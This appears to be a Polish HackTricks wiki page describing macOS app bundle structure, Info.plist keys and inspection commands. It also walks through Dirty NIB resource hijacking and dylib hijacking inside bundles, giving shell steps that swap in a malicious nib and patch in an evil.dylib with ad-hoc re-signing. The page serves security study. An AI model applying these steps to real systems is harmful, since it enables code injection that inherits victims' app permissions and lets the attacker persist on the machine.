# Bundles w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Bundles w macOS służą jako kontenery dla różnych zasobów, w tym aplikacji, bibliotek i innych niezbędnych plików, dzięki czemu w Finderze wyglądają jak pojedyncze obiekty, takie jak dobrze znane pliki `*.app`. Najczęściej spotykanym typem bundle jest bundle `.app`, choć powszechne są również inne typy, takie jak `.framework`, `.systemextension` i `.kext`.

### Niezbędne składniki bundle

Wewnątrz bundle, a w szczególności w katalogu `<application>.app/Contents/`, znajduje się wiele ważnych zasobów:

- **\_CodeSignature**: Ten katalog przechowuje informacje dotyczące podpisywania kodu, niezbędne do weryfikowania integralności aplikacji. Informacje o podpisywaniu kodu można sprawdzić za pomocą poleceń takich jak:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Zawiera wykonywalny plik binarny aplikacji, który jest uruchamiany po interakcji użytkownika.
- **Resources**: Repozytorium komponentów interfejsu użytkownika aplikacji, w tym obrazów, dokumentów i opisów interfejsu (plików nib/xib).
- **Info.plist**: Pełni funkcję głównego pliku konfiguracyjnego aplikacji, kluczowego dla prawidłowego rozpoznawania aplikacji przez system i interakcji z nią.

#### Ważne klucze w Info.plist

Plik `Info.plist` jest podstawą konfiguracji aplikacji i zawiera klucze takie jak:

- **CFBundleExecutable**: Określa nazwę głównego pliku wykonywalnego znajdującego się w katalogu `Contents/MacOS`.
- **CFBundleIdentifier**: Udostępnia globalny identyfikator aplikacji, szeroko wykorzystywany przez macOS do zarządzania aplikacjami.
- **LSMinimumSystemVersion**: Wskazuje minimalną wersję macOS wymaganą do uruchomienia aplikacji.

### Eksplorowanie Bundles

Aby wyświetlić zawartość bundle, takiego jak `Safari.app`, można użyć następującego polecenia: `bash ls -lR /Applications/Safari.app/Contents`

Eksploracja ujawnia katalogi takie jak `_CodeSignature`, `MacOS`, `Resources` oraz pliki takie jak `Info.plist`, z których każdy pełni określoną funkcję — od zabezpieczania aplikacji po definiowanie jej interfejsu użytkownika i parametrów działania.

#### Dodatkowe katalogi Bundles

Oprócz typowych katalogów bundles mogą również zawierać:

- **Frameworks**: Zawiera frameworki dołączone do aplikacji. Frameworki przypominają dylibs, ale zawierają dodatkowe zasoby.
- **PlugIns**: Katalog wtyczek i rozszerzeń zwiększających możliwości aplikacji.
- **XPCServices**: Przechowuje usługi XPC używane przez aplikację do komunikacji out-of-process.

Taka struktura zapewnia hermetyczne umieszczenie wszystkich niezbędnych komponentów w bundle, ułatwiając stworzenie modularnego i bezpiecznego środowiska aplikacji.

Więcej szczegółowych informacji na temat kluczy `Info.plist` i ich znaczenia można znaleźć w dokumentacji Apple dla developerów: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Uwagi dotyczące bezpieczeństwa i wektory nadużyć

- **Gatekeeper / App Translocation**: Gdy quarantined bundle jest uruchamiany po raz pierwszy, macOS wykonuje dokładną weryfikację sygnatury i może uruchomić go ze zrandomizowanej ścieżki translocation. Po zaakceptowaniu kolejne uruchomienia wykonują jedynie pobieżne kontrole; pliki zasobów w `Resources/`, `PlugIns/`, pliki nib itd. były historycznie pomijane. Od macOS 13 Ventura przy pierwszym uruchomieniu wymuszana jest dokładna kontrola, a nowe uprawnienie TCC *App Management* ogranicza procesy innych firm w modyfikowaniu pozostałych bundles bez zgody użytkownika, jednak starsze systemy nadal są podatne na ataki.
- **Kolizje Bundle Identifier**: Wiele embedded targets (PlugIns, helper tools) używających ponownie tego samego `CFBundleIdentifier` może zakłócić walidację sygnatury i sporadycznie umożliwić hijacking/confusion schematów URL. Zawsze wyliczaj sub-bundles i weryfikuj unikalność identyfikatorów.

## Resource Hijacking (Dirty NIB / NIB Injection)

Przed Ventura podmiana zasobów interfejsu użytkownika w podpisanej aplikacji mogła omijać pobieżne code signing i prowadzić do code execution z uprawnieniami aplikacji. Aktualne badania (2024) pokazują, że nadal działa to w systemach starszych niż Ventura oraz w buildach bez quarantine:<sup>[[1]](#references)[[2]](#references)</sup>

1. Skopiuj target app do lokalizacji z prawem zapisu (np. `/tmp/Victim.app`).
2. Zastąp `Contents/Resources/MainMenu.nib` (lub dowolny nib zadeklarowany w `NSMainNibFile`) złośliwym plikiem, który tworzy instancje `NSAppleScript`, `NSTask` itd.
3. Uruchom aplikację. Złośliwy nib wykona się w ramach bundle ID i entitlements ofiary (granty TCC, dostęp do mikrofonu/kamery itd.).
4. Ventura+ ogranicza ten problem poprzez dokładną weryfikację bundle przy pierwszym uruchomieniu oraz wymaganie uprawnienia *App Management* przy późniejszych modyfikacjach, dlatego persistence jest trudniejsze, jednak ataki podczas pierwszego uruchomienia w starszych wersjach macOS nadal są możliwe.<sup>[[1]](#references)</sup>

Minimalny przykład złośliwego payloadu nib (skompiluj xib do nib za pomocą `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking wewnątrz Bundles

Ponieważ wyszukiwanie `@rpath` preferuje dołączone Frameworks, umieszczenie złośliwej biblioteki w `Contents/Frameworks/` lub `Contents/PlugIns/` może przekierować kolejność ładowania, gdy główny binary jest podpisany bez library validation lub z nieprawidłową kolejnością `LC_RPATH`.

Typowe kroki podczas wykorzystywania unsigned/ad-hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notatki:
- Hardened runtime bez `com.apple.security.cs.disable-library-validation` blokuje third-party dylibs; najpierw sprawdź entitlements.
- Usługi XPC w `Contents/XPCServices/` często ładują sąsiednie frameworks — podobnie patchuj ich binaries na potrzeby persistence lub ścieżek privilege escalation.

## Ściągawka szybkiej inspekcji
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referencje

- [1] [Wprowadzanie wstrzykiwania procesów do widoku(-ów): wykorzystywanie aplikacji macOS przy użyciu plików nib (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB i write-up dotyczący manipulowania zasobami bundle (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
